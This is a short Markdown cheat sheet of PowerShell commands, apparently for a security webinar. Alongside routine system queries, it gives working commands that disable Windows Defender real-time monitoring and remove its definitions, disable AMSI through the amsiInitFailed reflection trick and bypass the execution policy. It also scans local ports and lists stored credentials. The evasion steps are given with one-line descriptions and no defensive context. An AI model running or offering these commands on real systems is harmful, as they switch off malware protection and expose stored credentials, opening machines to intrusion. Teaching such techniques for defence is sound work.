# PowerShell Commands for Webinar
## 1. Disable Windows Defender Realtime Monitoring
```powershell
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
Set-MpPreference -DisableRealtimeMonitoring $true
```
This command disables Windows Defender's real-time monitoring.
![Screenshot of disabling Windows Defender](./images/screenshot1.png)
---
## 2. Get Detailed OS Information
```powershell
Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
```
This command retrieves all properties of the operating system.
![Screenshot of Get-WmiObject command](./images/screenshot2.png)
---
## 3. Network Interface Information
```powershell
Get-NetIPConfiguration | Select-Object -Property InterfaceAlias, IPv4Address, IPv6Address, DNServer
```
This command retrieves network interface configuration, including IPv4 and IPv6 addresses.
![Screenshot of Network Interface Info](./images/screenshot3.png)
---
## 4. List Processes by CPU Usage
```powershell
Get-Process | Select-Object -Property ProcessName, Id, CPU | Sort-Object -Property CPU -Descending
```
This command retrieves running processes and sorts them by CPU usage in descending order.
![Screenshot of Get-Process command](./images/screenshot4.png)
---
## 5. Port Scanning (1-1024)
```powershell
1..1024 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $async = $sock.BeginConnect('localhost', $_, $null, $null); $wait = $async.AsyncWaitHandle.WaitOne(100, $false); if($sock.Connected) { $_ }; $sock.Close() }
```
This command performs a basic port scan on localhost for ports 1 to 1024.
![Screenshot of Port Scanning](./images/screenshot5.png)
---
## 6. Disable AMSI (Antimalware Scan Interface)
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic, Static').SetValue($null, $true)
```
This command disables AMSI by manipulating internal PowerShell structures.
![First Screenshot for AMSI Disable](./images/screenshot6_1.png)
![Second Screenshot for AMSI Disable](./images/screenshot6_2.png)
---
## 7. Bypass Execution Policy Temporarily
```powershell
$policy = Get-ExecutionPolicy; Set-ExecutionPolicy -ExecutionPolicyBypass -Scope Process;
# Scriptofyourchoice;
Set-ExecutionPolicy -ExecutionPolicy $policy -Scope Process
```
This command temporarily bypasses the execution policy for running scripts and then reverts it.
---
## 8. List Stored Credentials
```powershell
cmdkey/list
```
This command lists all stored credentials.
---
